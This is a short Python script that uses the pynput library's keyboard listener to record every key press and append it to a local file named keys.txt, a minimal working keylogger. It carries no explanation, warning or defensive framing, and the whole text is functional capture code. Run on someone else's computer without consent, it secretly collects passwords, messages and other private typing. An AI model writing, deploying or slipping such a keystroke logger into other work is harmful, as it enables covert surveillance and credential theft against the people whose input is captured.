from pynput.keyboard import Listener

def evnt_key_prass(key):
    f = open("keys.txt", "a")
    f.write(str(key).replace("'", '') + "\n")
    f.close()

obj = Listener(on_press=evnt_key_prass)
obj.start()
obj.join()